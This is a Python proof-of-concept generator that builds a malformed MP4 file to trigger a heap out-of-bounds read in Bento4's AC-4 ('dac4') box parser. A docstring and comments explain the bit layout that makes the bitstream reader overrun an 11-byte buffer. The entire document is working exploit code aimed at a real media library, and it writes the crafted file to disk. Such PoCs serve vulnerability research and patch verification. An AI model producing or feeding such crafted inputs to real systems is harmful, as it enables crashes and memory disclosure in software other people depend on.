#!/usr/bin/env python3
"""
PoC generator for Bento4 heap OOB read in AP4_Dac4Atom (VULN 001).

Vulnerability: AP4_BitReader::ReadCache() reads a 4-byte word at
  m_Buffer.GetData() + m_Position with no bounds check.
  In AP4_Dac4Atom constructor (ac4_dsi_version==1), after reading
  n_presentations=511, the parser reads bit_rate_mode(2) + bit_rate(32)
  + bit_rate_precision(32) = 66 bits. Starting from bit 24, this
  reaches bit 89, but the buffer is only 88 bits (11 bytes).
  ReadCache() will attempt to load 4 bytes from byte offset 10,
  reading bytes 10..13, but only byte 10 is valid -> heap OOB read.

CWE-125: Out-of-bounds Read
"""
import struct
import os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Dac4Atom_cpp"
OUT_PATH = os.path.join(POC_DIR, "vuln_001.mp4")


def make_box(fourcc, data):
    """Build an ISOBMFF box: [size:4][type:4][data]."""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('latin-1')
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data


def make_full_box(fourcc, version, flags, data):
    """Build an ISOBMFF full box: [size:4][type:4][version:1][flags:3][data]."""
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return make_box(fourcc, vf + data)


# ---------------------------------------------------------------------------
# dac4 payload: exactly 11 bytes (minimum to pass payload_size < 11 check)
#
# Bit layout (MSB first, i.e. bit 0 = MSB of byte 0):
#   bits  0- 2 : ac4_dsi_version = 1        (3 bits : 001)
#   bits  3- 9 : bitstream_version = 1      (7 bits : 0000001)
#   bit  10    : fs_index = 0               (1 bit  : 0)
#   bits 11-14 : frame_rate_index = 0       (4 bits : 0000)
#   bits 15-23 : n_presentations = 511      (9 bits : 111111111)
#   bits 24-87 : zeros (padding to 11 bytes)
#
# Byte 0 (bits  0- 7): 0,0,1,0,0,0,0,0 = 0x20
# Byte 1 (bits  8-15): 0,1,0,0,0,0,0,1 = 0x41
# Byte 2 (bits 16-23): 1,1,1,1,1,1,1,1 = 0xFF
# Bytes 3-10          : 0x00 (8 bytes padding)
#
# After header parsing (24 bits), since bitstream_version==1 (not >1),
# the program skips the short_program_id block, then reads:
#   bit_rate_mode (2) : bits 24-25
#   bit_rate (32)     : bits 26-57
#   bit_rate_precision(32): bits 58-89  <- crosses 88-bit boundary -> OOB
# ---------------------------------------------------------------------------
dac4_payload = bytes([0x20, 0x41, 0xFF]) + bytes(8)
assert len(dac4_payload) == 11, f"dac4 payload must be 11 bytes, got {len(dac4_payload)}"

dac4 = make_box('dac4', dac4_payload)

# ---------------------------------------------------------------------------
# Audio sample entry ('ac-4') containing the dac4 box
# ---------------------------------------------------------------------------
audio_entry_data = (
    b'\x00' * 6 +                        # reserved
    struct.pack('>H', 1) +               # data_reference_index = 1
    b'\x00' * 8 +                        # reserved
    struct.pack('>H', 2) +               # channel_count = 2
    struct.pack('>H', 16) +              # sample_size = 16-bit
    struct.pack('>H', 0) +               # pre_defined = 0
    struct.pack('>H', 0) +               # reserved = 0
    struct.pack('>I', 44100 << 16) +     # sample_rate as 16.16 fixed-point
    dac4                                 # dac4 box (codec-specific config)
)
audio_entry = make_box('ac-4', audio_entry_data)

# ---------------------------------------------------------------------------
# Sample table boxes
# ---------------------------------------------------------------------------
# stsd: sample description (1 entry: our ac-4 audio entry)
stsd = make_full_box('stsd', 0, 0, struct.pack('>I', 1) + audio_entry)

# stts: time-to-sample (0 entries)
stts = make_full_box('stts', 0, 0, struct.pack('>I', 0))

# stsc: sample-to-chunk (0 entries)
stsc = make_full_box('stsc', 0, 0, struct.pack('>I', 0))

# stsz: sample sizes (sample_size=0, sample_count=0)
stsz = make_full_box('stsz', 0, 0, struct.pack('>II', 0, 0))

# stco: chunk offsets (0 entries)
stco = make_full_box('stco', 0, 0, struct.pack('>I', 0))

# stbl: sample table
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

# ---------------------------------------------------------------------------
# Media information boxes
# ---------------------------------------------------------------------------
# url_: self-contained data reference (flags=0x000001)
url_entry = make_full_box('url ', 0, 1, b'')

# dref: data reference (1 entry)
dref = make_full_box('dref', 0, 0, struct.pack('>I', 1) + url_entry)

# dinf: data information
dinf = make_box('dinf', dref)

# smhd: sound media header (balance=0, reserved=0)
smhd = make_full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))

# minf: media information
minf = make_box('minf', smhd + dinf + stbl)

# ---------------------------------------------------------------------------
# Media boxes
# ---------------------------------------------------------------------------
# mdhd: media header
mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0) +  # ctime, mtime, timescale=44100, duration=0
    struct.pack('>HH', 0x55C4, 0)           # language='und' (packed ISO 639-2/T), pre_defined=0
)
mdhd = make_full_box('mdhd', 0, 0, mdhd_data)

# hdlr: handler reference (audio)
hdlr_data = (
    struct.pack('>I', 0) +     # pre_defined = 0
    b'soun' +                  # handler_type = 'soun' (audio)
    b'\x00' * 12 +             # reserved[3]
    b'SoundHandler\x00'        # name (null-terminated)
)
hdlr = make_full_box('hdlr', 0, 0, hdlr_data)

# mdia: media container
mdia = make_box('mdia', mdhd + hdlr + minf)

# ---------------------------------------------------------------------------
# Track boxes
# ---------------------------------------------------------------------------
identity_matrix = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000
)

# tkhd: track header (flags=3: track_enabled | track_in_movie)
tkhd_data = (
    struct.pack('>IIIII',
        0,    # creation_time
        0,    # modification_time
        1,    # track_id
        0,    # reserved
        0,    # duration
    ) +
    b'\x00' * 8 +                          # reserved
    struct.pack('>HHH', 0, 0, 0x0100) +    # layer, alternate_group, volume=1.0
    b'\x00' * 2 +                          # reserved
    identity_matrix +
    struct.pack('>II', 0, 0)               # width=0, height=0 (audio track)
)
tkhd = make_full_box('tkhd', 0, 3, tkhd_data)

# trak: track container
trak = make_box('trak', tkhd + mdia)

# ---------------------------------------------------------------------------
# Movie header
# ---------------------------------------------------------------------------
mvhd_data = (
    struct.pack('>IIIII',
        0,          # creation_time
        0,          # modification_time
        44100,      # timescale
        0,          # duration
        0x00010000, # rate = 1.0 (16.16 fixed-point)
    ) +
    struct.pack('>H', 0x0100) +    # volume = 1.0 (8.8 fixed-point)
    b'\x00' * 10 +                 # reserved
    identity_matrix +
    b'\x00' * 24 +                 # pre_defined[6]
    struct.pack('>I', 2)           # next_track_id = 2
)
mvhd = make_full_box('mvhd', 0, 0, mvhd_data)

# moov: movie container
moov = make_box('moov', mvhd + trak)

# ---------------------------------------------------------------------------
# File type box
# ---------------------------------------------------------------------------
ftyp_data = (
    b'mp42' +                  # major_brand
    struct.pack('>I', 0) +     # minor_version
    b'mp42' + b'isom'          # compatible_brands
)
ftyp = make_box('ftyp', ftyp_data)

# ---------------------------------------------------------------------------
# Assemble and write the MP4 file
# ---------------------------------------------------------------------------
mp4 = ftyp + moov

os.makedirs(POC_DIR, exist_ok=True)
with open(OUT_PATH, 'wb') as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUT_PATH}")
print(f"[+] dac4 payload (hex): {dac4_payload.hex()}")
print(f"[+] Bit layout:")
print(f"    bits  0- 2: ac4_dsi_version   = 1   (001)")
print(f"    bits  3- 9: bitstream_version = 1   (0000001)")
print(f"    bit  10   : fs_index          = 0   (0)")
print(f"    bits 11-14: frame_rate_index  = 0   (0000)")
print(f"    bits 15-23: n_presentations   = 511 (111111111)")
print(f"    bits 24-87: zeros (padding)")
print(f"[+] OOB occurs at bit_rate_precision read (bits 58-89) exceeding 88-bit buffer")
